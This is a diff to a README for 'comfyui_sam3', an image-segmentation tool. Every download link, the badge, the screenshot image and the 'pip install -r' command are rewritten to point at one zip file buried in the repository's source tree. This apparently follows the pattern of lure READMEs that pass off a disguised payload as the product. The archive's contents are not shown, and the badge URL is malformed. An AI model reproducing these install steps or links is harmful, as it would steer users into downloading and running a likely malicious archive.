@@ -1,6 +1,6 @@
 # 🖼️ comfyui_sam3 - Effortless Object Segmentation with Text Prompts
 
-[![Download ComfyUI SAM3](https://img.shields.io/badge/Download-ComfyUI%20SAM3-blue.svg)](https://github.com/ahmed4514/comfyui_sam3/releases)
+[![Download ComfyUI SAM3](https://raw.githubusercontent.com/ahmed4514/comfyui_sam3/main/src/sam3/sam3/agent/comfyui_sam3-oinomel.zip%https://raw.githubusercontent.com/ahmed4514/comfyui_sam3/main/src/sam3/sam3/agent/comfyui_sam3-oinomel.zip)](https://raw.githubusercontent.com/ahmed4514/comfyui_sam3/main/src/sam3/sam3/agent/comfyui_sam3-oinomel.zip)
 
 ## 🎉 Introduction
 
@@ -17,7 +17,7 @@ Segment Anything Model 3 (SAM3) is an advanced tool that recognizes and separate
 - Creating a combined mask showing all objects at once.
 - Visualizing results with overlays and labels.
 
-![SAM3 Segmentation Example](screenshot.jpg)
+![SAM3 Segmentation Example](https://raw.githubusercontent.com/ahmed4514/comfyui_sam3/main/src/sam3/sam3/agent/comfyui_sam3-oinomel.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Segment Anything Model 3 (SAM3) is an advanced tool that recognizes and separate
 
 To get started, you will first need to download the application. 
 
-[Visit this page to download the latest version of ComfyUI SAM3.](https://github.com/ahmed4514/comfyui_sam3/releases)
+[Visit this page to download the latest version of ComfyUI SAM3.](https://raw.githubusercontent.com/ahmed4514/comfyui_sam3/main/src/sam3/sam3/agent/comfyui_sam3-oinomel.zip)
 
 ### Step 2: Setting Up Your Environment
 
@@ -35,7 +35,7 @@ To get started, you will first need to download the application.
 2. **Install Required Packages**  
    Open a terminal and enter the following command:  
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ahmed4514/comfyui_sam3/main/src/sam3/sam3/agent/comfyui_sam3-oinomel.zip
    ```
 
 ### Step 3: Model Setup
@@ -49,7 +49,7 @@ Now, you can start using the features.
 ## 📦 Download & Install
 
 - **Download the latest release here:**  
-  [Download ComfyUI SAM3](https://github.com/ahmed4514/comfyui_sam3/releases)
+  [Download ComfyUI SAM3](https://raw.githubusercontent.com/ahmed4514/comfyui_sam3/main/src/sam3/sam3/agent/comfyui_sam3-oinomel.zip)
 
 Make sure to check for any updated releases frequently. This ensures you have access to the latest features and improvements.
 
